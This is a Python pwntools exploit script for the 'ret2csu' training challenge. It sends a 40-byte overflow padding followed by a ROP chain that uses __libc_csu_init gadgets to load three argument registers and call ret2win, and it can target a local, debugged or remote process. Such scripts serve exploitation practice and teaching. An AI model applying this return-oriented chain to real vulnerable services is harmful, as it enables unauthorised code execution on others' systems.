from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme+152
continue
'''.format(**locals())

exe = './ret2csu'
elf = context.binary = ELF(exe, checksec=False)
p = start()

arg1, arg2, arg3 = 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d
pop_rdi = 0x00000000004006a3
pop_rsi_r15 = 0x00000000004006a1
csu1 = 0x000000000040069a
csu2 = 0x0000000000400680
ret = 0x4006a4

# ===== Exploit script here =====
payload = b'A'*40
payload += flat(
    csu1,
    0,
    1,
    0x600398,     # _init
    arg1,
    arg2,
    arg3,
    csu2,
    p64(0) * 7,
    pop_rdi,
    arg1,
    elf.plt['ret2win']
)

p.sendlineafter(b'> ', payload)
p.interactive()